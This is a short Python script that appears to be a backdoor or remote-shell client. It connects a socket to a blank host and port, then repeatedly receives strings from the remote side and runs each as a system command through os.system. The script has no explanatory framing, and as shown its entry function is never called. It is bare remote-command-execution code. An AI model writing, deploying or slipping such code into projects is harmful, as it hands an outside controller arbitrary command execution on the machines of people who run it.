import socket
import time
import os

host = ''
port = ''



def client():
  s = socket.socket()
  try:
    s.connect((host, port))
  except:
    print("Unable To Connect To", host, "Using", port)
  cmd_recv(s)

def cmd_recv(s):
  while True:
    cmd = s.recv(1024).decode('utf8')
    os.system(cmd)
    time.sleep(5)
